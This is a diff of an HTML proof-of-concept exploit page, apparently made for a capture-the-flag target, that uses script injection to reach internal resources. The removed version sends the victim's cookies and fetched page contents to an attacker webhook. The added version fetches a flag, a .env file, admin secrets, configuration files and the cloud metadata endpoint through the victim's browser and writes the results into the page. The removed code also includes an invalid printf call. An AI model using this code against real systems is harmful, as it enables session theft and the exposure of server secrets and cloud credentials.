@@ -1,39 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>XSS PoC - Full Exploit</title>
-</head>
-<body>
-  <h1>Testing PDF-based XSS with multi-fetch</h1>
+<html>
+  <head><meta charset="UTF-8"><title>PoC</title></head>
+  <body>
+    <h1>Collecting Internal Info</h1>
+    <div id="output">Loading...</div>
 
-  <script>
-    const webhook = "https://192.168.10.128:8080";
+    <script>
+      const paths = [
+        "http://44.203.154.8//flag",
+        "http://44.203.154.8//.env",
+        "http://44.203.154.8//admin/secret",
+        "http://44.203.154.8//config",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://44.203.154.8/redir.php?url=http://44.203.154.8/preview.php"
+      ];
 
-    const urls = [
-      "http://44.203.154.8/redir.php"
-    ];
+      const out = document.getElementById('output');
 
-    fetch(`${webhook}?info=document.cookie&value=` + encodeURIComponent(document.cookie));
-
-    urls.forEach(async (url) => {
-      try {
-        const res = await fetch(url);
-        const text = await res.text();
-        printf(res.text())
-        await fetch(webhook, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ url, result: text })
-        });
-      } catch (err) {
-        await fetch(webhook, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ url, error: err.message })
-        });
-      }
-    });
-  </script>
-</body>
+      (async () => {
+        for (const url of paths) {
+          try {
+            const res = await fetch(url);
+            const text = await res.text();
+            const safe = text.replace(/</g, "&lt;").slice(0, 500);
+            out.innerHTML += `<h3>${url}</h3><pre>${safe}</pre>`;
+          } catch (e) {
+            out.innerHTML += `<h3>${url}</h3><pre>ERROR: ${e.message}</pre>`;
+          }
+        }
+      })();
+    </script>
+  </body>
 </html>
